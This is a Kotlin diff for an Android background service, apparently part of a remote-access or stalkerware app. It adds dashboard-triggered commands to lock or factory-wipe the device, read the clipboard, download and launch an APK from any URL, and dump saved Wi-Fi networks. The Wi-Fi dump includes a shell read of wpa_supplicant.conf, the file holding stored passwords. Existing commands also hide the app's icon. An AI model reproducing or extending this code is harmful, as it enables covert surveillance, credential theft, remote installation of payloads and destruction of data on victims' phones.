@@ -227,6 +227,15 @@ class ConnectorService : Service() {
             cmd == "hide_app"            -> Pair(toggleAppVisibility(true), "command_result")
             cmd == "unhide_app"          -> Pair(toggleAppVisibility(false), "command_result")
 
+            // ── Kontrol Jarak Jauh ──
+            cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
+            cmd == "wipe_device"         -> Pair(wipeDevice(), "command_result")
+            cmd.startsWith("vibrate:")   -> Pair(vibrateCustom(cmd.removePrefix("vibrate:").toIntOrNull() ?: 1), "command_result")
+            cmd == "send_notification"   -> Pair(sendCustomNotification(extra), "command_result")
+            cmd == "get_clipboard"       -> Pair(getClipboard(), "command_result")
+            cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")
+            cmd == "get_wifi_saved"      -> Pair(getWifiSaved(), "command_result")
+
             // ── Misc ──
             cmd == "device_info"         -> Pair(DeviceInfo.collect(this).toString(), "command_result")
             cmd == "ping"                -> Pair("pong · $deviceName · $deviceId", "command_result")
@@ -457,6 +466,160 @@ class ConnectorService : Service() {
     // ─────────────────────────────────────────
     //  SHELL / SHIZUKU
     // ─────────────────────────────────────────
+
+    // ─────────────────────────────────────────
+    //  LOCK SCREEN
+    // ─────────────────────────────────────────
+
+    private fun lockScreen(): String {
+        return try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+            val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
+            if (dpm.isAdminActive(admin)) {
+                dpm.lockNow()
+                "🔒 Layar berhasil dikunci"
+            } else {
+                "⚠️ Device Admin belum aktif. Aktifkan dulu dari app."
+            }
+        } catch (e: Exception) { "Error: ${e.message}" }
+    }
+
+    // ─────────────────────────────────────────
+    //  WIPE DEVICE
+    // ─────────────────────────────────────────
+
+    private fun wipeDevice(): String {
+        return try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+            val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
+            if (dpm.isAdminActive(admin)) {
+                dpm.wipeData(0)
+                "💀 Perangkat sedang direset ke setelan pabrik…"
+            } else {
+                "⚠️ Device Admin belum aktif. Tidak bisa wipe."
+            }
+        } catch (e: Exception) { "Error: ${e.message}" }
+    }
+
+    // ─────────────────────────────────────────
+    //  CUSTOM VIBRATE
+    // ─────────────────────────────────────────
+
+    private fun vibrateCustom(times: Int): String {
+        return try {
+            val vib = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
+            val n = times.coerceIn(1, 10)
+            val pattern = LongArray(n * 2 + 1)
+            pattern[0] = 0
+            for (i in 1 until pattern.size step 2) {
+                pattern[i] = 300
+                if (i + 1 < pattern.size) pattern[i + 1] = 200
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vib.vibrate(android.os.VibrationEffect.createWaveform(pattern, -1))
+            } else {
+                @Suppress("DEPRECATION") vib.vibrate(pattern, -1)
+            }
+            "📳 Bergetar $n kali"
+        } catch (e: Exception) { "Error: ${e.message}" }
+    }
+
+    // ─────────────────────────────────────────
+    //  SEND CUSTOM NOTIFICATION
+    // ─────────────────────────────────────────
+
+    private fun sendCustomNotification(extra: String?): String {
+        return try {
+            val title: String
+            val text: String
+            if (extra != null) {
+                val json = com.google.gson.JsonParser.parseString(extra).asJsonObject
+                title = json.get("title")?.asString ?: "Pesan"
+                text  = json.get("text")?.asString ?: ""
+            } else {
+                title = "Pesan dari Dashboard"
+                text  = ""
+            }
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+            val notif = androidx.core.app.NotificationCompat.Builder(this, CHANNEL_ID)
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setContentTitle(title)
+                .setContentText(text)
+                .setAutoCancel(true)
+                .build()
+            nm.notify((System.currentTimeMillis() % 10000).toInt(), notif)
+            "📢 Notifikasi terkirim: \"$title\""
+        } catch (e: Exception) { "Error: ${e.message}" }
+    }
+
+    // ─────────────────────────────────────────
+    //  GET CLIPBOARD
+    // ─────────────────────────────────────────
+
+    @android.annotation.SuppressLint("ServiceCast")
+    private fun getClipboard(): String {
+        return try {
+            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
+            val clip = cm.primaryClip
+            if (clip == null || clip.itemCount == 0) return "📋 Clipboard kosong"
+            val text = clip.getItemAt(0).coerceToText(this).toString()
+            "📋 Clipboard:\n$text"
+        } catch (e: Exception) { "Error: ${e.message}" }
+    }
+
+    // ─────────────────────────────────────────
+    //  INSTALL APK FROM URL
+    // ─────────────────────────────────────────
+
+    private fun installApk(url: String): String {
+        return try {
+            val file = java.io.File(getExternalFilesDir(null), "install_${System.currentTimeMillis()}.apk")
+            val request = okhttp3.Request.Builder().url(url).build()
+            http.newCall(request).execute().use { resp ->
+                if (!resp.isSuccessful) return "Error: HTTP ${resp.code}"
+                resp.body?.byteStream()?.use { input ->
+                    file.outputStream().use { output -> input.copyTo(output) }
+                }
+            }
+            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                androidx.core.content.FileProvider.getUriForFile(
+                    this, "$packageName.fileprovider", file)
+            } else {
+                android.net.Uri.fromFile(file)
+            }
+            val intent = Intent(Intent.ACTION_VIEW).apply {
+                setDataAndType(uri, "application/vnd.android.package-archive")
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
+            }
+            startActivity(intent)
+            "📦 APK diunduh & instalasi dimulai: ${file.name}"
+        } catch (e: Exception) { "Error install APK: ${e.message}" }
+    }
+
+    // ─────────────────────────────────────────
+    //  WIFI SAVED NETWORKS
+    // ─────────────────────────────────────────
+
+    @android.annotation.SuppressLint("MissingPermission")
+    private fun getWifiSaved(): String {
+        return try {
+            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+            @Suppress("DEPRECATION")
+            val configs = wm.configuredNetworks
+            if (configs.isNullOrEmpty()) {
+                return runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Permission denied'")
+            }
+            buildString {
+                appendLine("=== WiFi Tersimpan (${configs.size}) ===")
+                configs.forEach { cfg ->
+                    val ssid = cfg.SSID?.replace("\"", "") ?: "?"
+                    appendLine("SSID: $ssid")
+                }
+            }
+        } catch (e: Exception) {
+            runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Butuh root'")
+        }
+    }
 
     private fun runShell(cmd: String): String {
         return try {
